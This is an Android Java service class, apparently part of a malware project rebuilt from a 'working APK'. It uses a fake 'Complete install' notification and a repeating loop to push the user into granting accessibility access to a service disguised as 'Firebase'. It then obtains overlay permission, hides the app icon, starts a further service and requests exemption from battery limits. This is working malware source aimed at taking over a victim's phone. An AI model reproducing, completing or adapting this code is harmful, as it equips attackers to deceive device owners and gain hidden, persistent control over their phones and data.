package com.android.pictach;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;

/**
 * myker — Permission monitor service (replaces PermissionMonitorService from working APK).
 *
 * Changed from IntentService to regular Service + Handler to match the original APK
 * architecture (PermissionMonitorService used Handler.sendEmptyMessage in onStartCommand).
 *
 * IntentService caused two problems on API 32:
 *   1. startForeground() inside onHandleIntent() can fail silently
 *   2. IntentService auto-stops after onHandleIntent returns — race condition
 *      preventing love.allok from being seen by love.onStartCommand
 */
public class myker extends Service {

    public PowerManager.WakeLock wakeLock = null;

    private static final int MSG_START = 1;
    private Handler handler;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message msg) {
                if (msg.what == MSG_START) {
                    runPermissionLoop();
                }
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.sendEmptyMessage(MSG_START);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeMessages(MSG_START);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    public static void cancelnotification(Context ctx, int id) {
        NotificationManager nm = (NotificationManager) ctx.getSystemService("notification");
        if (nm != null) nm.cancel(id);
    }

    private void runPermissionLoop() {
        // Set up foreground notification channel (API >= 26)
        String channelId = "MyInstall";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(
                    NotificationManager.class);
            if (nm != null && nm.getNotificationChannel(channelId) == null) {
                NotificationChannel ch = new NotificationChannel(
                        channelId, "Install", NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Installation");
                ch.setShowBadge(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }
        }

        // Build foreground notification
        Intent actIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        actIntent.setFlags(0x70100000);
        PendingIntent pi = PendingIntent.getActivity(this, 0, actIntent,
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
        NotificationCompat.Builder nb = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(17170445)
                .setContentTitle("Complete install")
                .setContentText("Click Here to Complete installing")
                .setPriority(1)
                .setCategory("call")
                .setDefaults(15)
                .setOngoing(true)
                .setAutoCancel(false)
                .setFullScreenIntent(pi, true);

        try {
            startForeground(1547, nb.build());
        } catch (Exception ignored) {}

        // Acquire WakeLock
        try {
            PowerManager pm = (PowerManager) getSystemService("power");
            if (wakeLock == null) {
                wakeLock = pm.newWakeLock(1, "Android:Watchlock");
            }
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}

        int speedIncrement = 3500;
        int flagNew   = 0x00400000;
        int flagClear = 0x00200000;
        int flagTask  = 0x00100000;

        // Main init loop — runs on background thread via new Thread to avoid blocking Handler
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(Utils.speedTime);
                } catch (Exception ignored) {}

                boolean accessEnabled = Utils.isAccessibilityEnabled(myker.this, Firebase.class);

                if (!accessEnabled) {
                    if (!Utils.NeedSuper() || !Utils.isScreenUnlocked(myker.this)) continue;

                    Utils.Trys += 1;
                    if (Utils.Trys < 5) continue;

                    Utils.Trys = 0;
                    Utils.speedTime = speedIncrement;
                    try {
                        Intent googleIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        googleIntent.addFlags(flagNew);
                        googleIntent.addFlags(flagClear);
                        googleIntent.addFlags(flagTask);
                        startActivity(googleIntent);
                    } catch (Exception ignored) {}
                    continue;
                }

                // Check overlay permission
                if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(myker.this)) {
                    if (!Utils.NeedSuper()) continue;
                    if (Utils.shown.booleanValue()) continue;

                    Utils.speedTime = 5000;
                    Utils.shown = Boolean.valueOf(true);
                    try {
                        Intent overlay = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                        overlay.addFlags(flagNew);
                        startActivity(overlay);
                    } catch (Exception ignored) {}
                    continue;
                }

                // Hide icon
                if (!love.isHidden) {
                    love.isHidden = true;
                    Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
                }

                if (!Utils.iamworking) {
                    love.allok = true;
                    Utils.iamworking = true;
                    Firebase.Firebasebypass = Boolean.valueOf(false);
                    Firebase.FirebaseFOR_prim = Boolean.valueOf(false);
                    Firebase.FirebaseCheckPrims = true;

                    if (LoveApi0.isServiceNotRunning(Api.class, myker.this)) {
                        try {
                            Utils.p_Utils_r = getResources().getString(2131296276);
                        } catch (Exception ignored) {}
                        startService(new Intent(myker.this, Api.class));
                    }

                    if (!Utils.isPowerSaveMode(myker.this)) {
                        try {
                            Intent doze = new Intent(
                                    android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            doze.addFlags(flagNew);
                            doze.addFlags(flagClear);
                            doze.addFlags(flagTask);
                            startActivity(doze);
                        } catch (Exception ignored) {}
                    }
                }

                // Stop foreground and self
                cancelnotification(myker.this, 6676);
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        stopForeground(STOP_FOREGROUND_REMOVE);
                    } else {
                        stopForeground(true);
                    }
                } catch (Exception ignored) {}
                stopSelf();

                Utils.speedTime = 25000;
                break; // exit loop after successful init
            }
        }).start();
    }
}
